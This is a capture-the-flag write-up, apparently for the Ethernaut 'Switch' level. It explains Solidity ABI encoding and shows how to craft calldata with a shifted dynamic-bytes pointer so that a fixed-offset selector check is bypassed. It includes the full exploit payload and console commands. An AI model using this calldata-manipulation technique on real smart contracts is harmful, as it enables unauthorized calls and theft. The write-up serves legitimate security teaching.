# Switch

The goal of this level is to flip the switch. We need to set `switchOn` to `true` in order to flip the switch. The only function we can call is `flipSwitch()` because the other two functions are locked behind an `onlyThis` modifier which checks whether `msg.sender == address(this)`. The issue with the `flipSwitch()` function is that it contains the `onlyOff` modifier:
```
modifier onlyOff() {
    // we use a complex data type to put in memory
    bytes32[1] memory selector;
    // check that the calldata at position 68 (location of _data)
    assembly {
        calldatacopy(selector, 68, 4) // grab function selector from calldata
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}
```
The `onlyOff` modifier checks the calldata starting at position 68 ensuring that the next 4 bytes is the selector of the `turnOffSwitch()` function. At first glance, it seems that the `flipSwitch()` function can only be called with the `turnSwitchOff()` function as its `_data`. However, this isn't true if we are able to manipulate the calldata encoding. 

## Understanding ABI Encoding

The calldata for Solidity functions are encoded using the [Contract ABI Specification](https://docs.soliditylang.org/en/v0.8.11/abi-spec.html) - the standard way to interact with contracts in the Ethereum ecosystem. Data is encoded according to its type, outlined in the specification. There are a few things within this specification that are useful for this level.

The first four bytes of the call data for a function call specifies the function to be called. The signature is defined as the function name with the parenthesised list of parameter types. Parameter types are split by a single comma with no spaces. The return type is not part of this signature.

The encoded arguments follow starting from the fifth byte. Here, we are interested in the `bytes` and `address` types. There is a crucial difference to note between `bytes<M>` and `bytes`. `bytes<M>` is the binary of type `M` bytes where `0 < M <= 32` whereas `bytes` is a *dynamic sized* byte sequence - remember this. Type `address` is equivalent to `uint160`, except for the assumed interpretation and language typing. For computing the function selector, `address` is used.

## The Vulnerability

The flaw here is that the modifier has a hardcoded offset of 68 to fetch the function byte signature from the calldata. The offset is set to 68 because of the data returned when you call `flipSwitch()` using the function byte signature for `turnSwitchOff()`:
```
'0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000'
```
If we start at the 68th byte and get the next 4 bytes we'd have `20606e15`, add `0x` at the front and you have the function byte signature of `turnSwitchOff()`. If we clean up the calldata, seperating the function byte signature and the remaining payload into 32-byte segments we get:
```
Function byte signature: 30c13ade

00: 0000000000000000000000000000000000000000000000000000000000000020
20: 0000000000000000000000000000000000000000000000000000000000000004
40: 20606e1500000000000000000000000000000000000000000000000000000000
```
Here, `30c13ade` is the function selector for `flipSwitch(bytes)`. Since `bytes` is a *dynamic* type, it can consume any number of 32-byte segments. To avoid spilling into other slots and colliding with other arguments passed into the function, the `00` slot is actually a pointer to the calldata slot where the `bytes` value can be found. The ABI for `00` reads, "Hey, go to slot 20 to find the actual value of `bytes`". Slot `20` is the beginning of the `bytes` value, storing the length of the actual bytes since it is of variable length. Slot `40` holds the bytes passed into the function: `20606e15`.

## The Exploit

We can exploit this by passing in a completely different pointer, while keeping the bytes in slot `40` to trick the `onlyOff` modifier:
```
Function byte signature: 30c13ade

00: 0000000000000000000000000000000000000000000000000000000000000060
20: 0000000000000000000000000000000000000000000000000000000000000000
40: 20606e1500000000000000000000000000000000000000000000000000000000
60: 0000000000000000000000000000000000000000000000000000000000000004
80: 76227e1200000000000000000000000000000000000000000000000000000000
```
Here, slot `00` is telling the program to jump to offset `60` instead of `40`. At `60` and `80` we have the value of `_data` which is `76227e12` - the function byte selector for `turnSwitchOn()`. We leave the bytes in slot `40` in order to trick the `onlyOff` modifier. It is vital to note that the EVM has no conception of ABI encoding or function byte signatures.

To pass this level, a contract is not needed; we can do everything we need within the console:
```
const trickData = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

await sendTransaction({from: player, to: contract.address, data: trickData});

await contract.switchOn();
```